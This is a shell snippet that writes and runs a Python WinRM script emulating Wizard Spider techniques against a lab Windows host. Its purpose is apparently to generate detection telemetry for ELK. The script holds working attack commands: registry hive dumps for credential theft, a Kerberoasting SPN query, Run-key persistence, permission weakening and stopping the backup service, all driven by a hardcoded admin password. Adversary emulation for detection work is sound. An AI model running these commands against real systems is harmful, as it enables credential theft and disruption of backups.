pip3 install pywinrm

cat > attack.py << 'SCRIPT'
#!/usr/bin/env python3
"""Wizard Spider TTP chain — runs against one Windows target via WinRM."""

import winrm
import time
import sys

TARGET = "10.0.1.4"          # Dorothy
USER   = "OZ\\Administrator"
PASS   = "WizSpider-Lab2024!"

def run(session, desc, cmd, ps=True):
    print(f"\n[*] {desc}")
    print(f"    > {cmd[:120]}")
    try:
        if ps:
            r = session.run_ps(cmd)
        else:
            r = session.run_cmd(cmd)
        out = r.std_out.decode().strip()
        err = r.std_err.decode().strip()
        if out:
            print(f"    {out[:200]}")
        if err and "error" in err.lower():
            print(f"    [!] {err[:200]}")
    except Exception as e:
        print(f"    [!] {e}")
    time.sleep(2)

s = winrm.Session(
    f"http://{TARGET}:5985/wsman",
    auth=(USER, PASS),
    transport="ntlm"
)

print(f"=== Wizard Spider TTP chain against {TARGET} ===\n")

# --- Discovery (T1082, T1016, T1087, T1049, T1007) ---
run(s, "T1082 - System info discovery", "systeminfo")
run(s, "T1016 - Network config discovery", "ipconfig /all")
run(s, "T1087.001 - Local account enum", "net user")
run(s, "T1087.002 - Domain account enum", "net user /domain")
run(s, "T1049 - Network connections", "netstat -ano")
run(s, "T1007 - Service discovery", "sc query type= service state= all")
run(s, "T1482 - Domain trust discovery", "nltest /domain_trusts")
run(s, "T1069.002 - Domain group enum", "net group \"Domain Admins\" /domain")

# --- Credential Access (T1003, T1558.003) ---
run(s, "T1003.003 - Credential harvesting (registry)", "reg save HKLM\\SAM C:\\Windows\\Temp\\sam.save", ps=False)
run(s, "T1003.003 - Credential harvesting (registry)", "reg save HKLM\\SYSTEM C:\\Windows\\Temp\\sys.save", ps=False)
run(s, "T1558.003 - Kerberoasting (SPN query)",
    "setspn -T oz.local -Q */*")

# --- Persistence (T1547.001) ---
run(s, "T1547.001 - Registry Run key persistence",
    'reg add "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v Updater /t REG_SZ /d "C:\\Windows\\Temp\\svchost.exe" /f',
    ps=False)

# --- Defense Evasion (T1070.004, T1222.001) ---
run(s, "T1070.004 - File deletion",
    "echo test > C:\\Windows\\Temp\\evidence.txt && del C:\\Windows\\Temp\\evidence.txt",
    ps=False)
run(s, "T1222.001 - File permission mod",
    "icacls C:\\Windows\\Temp /grant Everyone:F", ps=False)

# --- Lateral Movement Prep (T1021.001) ---
run(s, "T1021.001 - Test RDP connectivity to Toto",
    "Test-NetConnection -ComputerName 10.0.1.5 -Port 3389 | Select-Object TcpTestSucceeded")

# --- Collection (T1005, T1119) ---
run(s, "T1005 - Collect local files",
    'Get-ChildItem C:\\Users -Recurse -Include *.docx,*.xlsx,*.pdf -ErrorAction SilentlyContinue | Select-Object FullName')
run(s, "T1074.001 - Stage collected data",
    "mkdir C:\\Windows\\Temp\\staging -Force; Copy-Item C:\\Windows\\Temp\\sam.save C:\\Windows\\Temp\\staging\\ -Force")

# --- Impact (T1489, T1490, T1486) ---
run(s, "T1489 - Stop backup service",
    "sc stop wbengine", ps=False)
run(s, "T1490 - Delete shadow copies",
    "vssadmin list shadows", ps=False)
run(s, "T1486 - Simulate encryption (create ransom artifacts)",
    """
1..5 | ForEach-Object {
    $f = "C:\\Windows\\Temp\\staging\\file$_.txt"
    "sensitive data $_" | Out-File $f
    Rename-Item $f "$f.ryk"
}
Get-ChildItem C:\\Windows\\Temp\\staging\\*.ryk
""")

# --- Cleanup (T1070.004) ---
run(s, "T1070.004 - Clean up artifacts",
    """
Remove-Item C:\\Windows\\Temp\\staging -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item C:\\Windows\\Temp\\sam.save -Force -ErrorAction SilentlyContinue
Remove-Item C:\\Windows\\Temp\\sys.save -Force -ErrorAction SilentlyContinue
reg delete "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v Updater /f
""")

print("\n=== Complete — check ELK for telemetry ===")
SCRIPT

python3 attack.py